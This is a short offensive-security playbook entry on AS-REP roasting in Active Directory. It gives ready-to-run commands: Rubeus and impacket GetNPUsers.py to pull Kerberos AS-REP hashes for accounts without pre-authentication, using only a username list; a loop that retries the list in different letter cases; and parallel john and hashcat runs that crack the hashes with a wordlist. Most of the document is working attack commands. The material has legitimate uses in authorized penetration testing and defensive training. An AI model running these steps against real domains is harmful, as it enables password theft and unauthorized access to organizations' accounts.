# AS-REP Roast

## When this applies

- Active Directory environment containing user accounts with `DONT_REQ_PREAUTH` UAC flag.
- You have a username candidate list (no password required).
- Goal: extract AS-REP material that can be cracked offline.

## Technique

When Kerberos pre-authentication is disabled for an account, the KDC returns an AS-REP encrypted with the user's password-derived key in response to a single AS-REQ. That encrypted blob can be cracked offline.

## Steps

```powershell
# On Windows host: find users without Kerberos pre-auth (DONT_REQ_PREAUTH)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

```bash
# From Linux/macOS, no creds needed — only a username candidate list:
GetNPUsers.py 'DOMAIN/' -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat
# users.txt is built from any source (web team page, LDAP null bind, RPC enum,
# osint). DOMAIN must be uppercase.

# CASE-SENSITIVITY: try the same list in lowercase, capitalized, and ALL-CAPS.
# Some KDC implementations return a hash for one casing of a sAMAccountName but
# 'KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN' for another. Cheap and worth the few seconds.
for case in lower title upper; do
  python3 -c "
import sys; m={'lower':str.lower,'title':str.title,'upper':str.upper}
[print(m['$case'](l.strip())) for l in open('users.txt')]" > users.$case
  GetNPUsers.py 'DOMAIN/' -usersfile users.$case -no-pass -dc-ip DC_IP -format hashcat 2>/dev/null
done

# Crack captured hashes — these are hashes you obtained from the wire, not
# credential brute force. Run john + hashcat IN PARALLEL on the same wordlist:
john --format=krb5asrep --wordlist=rockyou.txt asrep.txt &
hashcat -m 18200 asrep.txt rockyou.txt &
wait
# john (CPU) often wins for small jobs because hashcat pays a one-time
# kernel-compile cost on first run; for long runs hashcat overtakes.
```

## Verifying success

- Hashes begin with `$krb5asrep$23$user@DOMAIN:...`.
- After cracking, the cleartext password authenticates to AD.

## Common pitfalls

- Username case mismatch returns `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` — sweep cases (lower/title/upper).
- Silver tickets cannot be forged from AS-REP-roast hashes — those are user keys, not service keys; use Kerberoast hashes for silver tickets.

## Tools

- Rubeus (`asreproast`)
- impacket `GetNPUsers.py`
- hashcat (`-m 18200`)
- john (`--format=krb5asrep`)
